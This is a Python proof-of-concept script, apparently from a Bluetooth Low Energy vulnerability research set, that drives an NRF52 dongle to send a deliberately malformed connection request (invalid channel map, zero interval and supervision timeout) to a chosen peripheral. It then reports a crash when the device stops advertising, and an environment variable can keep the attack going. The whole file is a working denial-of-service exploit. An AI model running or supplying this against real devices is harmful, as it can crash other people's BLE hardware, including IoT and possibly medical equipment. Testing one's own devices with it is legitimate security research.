#!/usr/bin/env python

import os
import platform
import sys
from threading import Timer
from time import sleep

# libs
sys.path.insert(0, os.getcwd() + '/libs')
import colorama
from colorama import Fore
from drivers.NRF52_dongle import NRF52Dongle
from scapy.layers.bluetooth4LE import *
from discover import discover_attacker_dongle

# Default master address
master_address = '5d:36:ac:90:0b:22'
access_address = 0x9a328370
connecting = False
slave_txaddr = 0
none_count = 0
slave_connected = False
send_version_ind = False
end_connection = False
attack = True

# Autoreset colors
colorama.init(autoreset=True)

# Get serial port from command line
attacker_serial_port = discover_attacker_dongle()
if None in attacker_serial_port:
    print(Fore.RED + 'Platform not identified')
    sys.exit(0)
else:
    serial_port = attacker_serial_port[0]

print(Fore.YELLOW + 'Serial port: ' + serial_port)

# Get advertiser_address from command line (peripheral addr)
if len(sys.argv) >= 2:
    advertiser_address = sys.argv[1].lower()
else:
    advertiser_address = 'c8:c9:a3:d3:65:1e'

print(Fore.YELLOW + 'Advertiser Address: ' + advertiser_address.lower())


def crash_timeout():
    global connecting, run_script
    connecting = False
    print(Fore.RED + "No advertisement from " + advertiser_address.lower() +
          ' received\nThe device may have crashed!!!')
    run_script = False


def scan_timeout():
    global timeout_scan, connecting
    connecting = False
    if not slave_connected:
        scan_req = BTLE() / BTLE_ADV(RxAdd=slave_txaddr) / BTLE_SCAN_REQ(
            ScanA=master_address,
            AdvA=advertiser_address)

        driver.send(scan_req)

    timeout_scan = Timer(2.0, scan_timeout)
    timeout_scan.daemon = True
    timeout_scan.start()


# Open serial port of NRF52 Dongle
driver = NRF52Dongle(serial_port, '115200')
# Send scan request
scan_req = BTLE() / BTLE_ADV(RxAdd=0) / BTLE_SCAN_REQ(
    ScanA=master_address,
    AdvA=advertiser_address)
driver.send(scan_req)

# Start the scan timeout to resend packets
timeout_scan = Timer(2.0, scan_timeout)
timeout_scan.daemon = True
timeout_scan.start()

timeout = Timer(5.0, crash_timeout)
timeout.daemon = True
timeout.start()

print(Fore.YELLOW + 'Waiting advertisements from ' + advertiser_address)
while attack:
    pkt = None
    # Receive packet from the NRF52 Dongle
    data = driver.raw_receive()
    if data:
        # Decode Bluetooth Low Energy Data
        pkt = BTLE(data)
        # if packet is incorrectly decoded, you may not be using the dongle
        if pkt is None:
            none_count += 1
            if none_count >= 4:
                print(Fore.RED + 'NRF52 Dongle not detected')
                sys.exit(0)
            continue
        # --------------- Process Link Layer Packets here ------------------------------------
        # Check if packet from advertised is received
        if pkt and (BTLE_SCAN_RSP in pkt or BTLE_ADV_IND in pkt) and pkt.AdvA == advertiser_address.lower() \
                and not connecting:
            timeout.cancel()
            print(Fore.GREEN + advertiser_address.lower() + ': ' + pkt.summary()[7:] + ' Detected')
            connecting = True
            slave_txaddr = pkt.TxAdd
            conn_request = BTLE() / BTLE_ADV(RxAdd=slave_txaddr, TxAdd=0) / BTLE_CONNECT_REQ(
                InitA=master_address,
                AdvA=advertiser_address,
                AA=access_address,  # Access address (any)
                crc_init=0x179a9c,  # CRC init (any)
                win_size=2,  # 2.5 of windows size (anchor connection window size)
                win_offset=1,  # 1.25ms windows offset (anchor connection point)
                interval=0,  # 20ms connection interval
                latency=0,  # Slave latency (any)
                timeout=0,  # Supervision timeout, 500ms (any)
                chM=0,  # Invalid channel map
                hop=5,  # Hop increment (any)
                SCA=0,  # Clock tolerance
            )
            # Yes, we're sending raw link layer messages in Python. Don't tell anyone as this is forbidden!!!
            sleep(2)
            driver.send(conn_request)  # Send connection request to advertiser
            print(Fore.YELLOW + 'Malformed connection request was sent')
            if 'CONTINUE_ATTACK' in os.environ:
                attack = True
            else:
                attack = False

            # Start the timeout to detect crashes
            timeout = Timer(5.0, crash_timeout)
            timeout.daemon = True
            timeout.start()
        elif BTLE_DATA in pkt:
            timeout.cancel()
            print(Fore.YELLOW + "Slave RX <--- " + pkt.summary()[7:] + Fore.RESET)

    sleep(0.01)

#driver.save_pcap()
#print(Fore.GREEN + "Capture saved in logs/invalid_channel_map.pcap")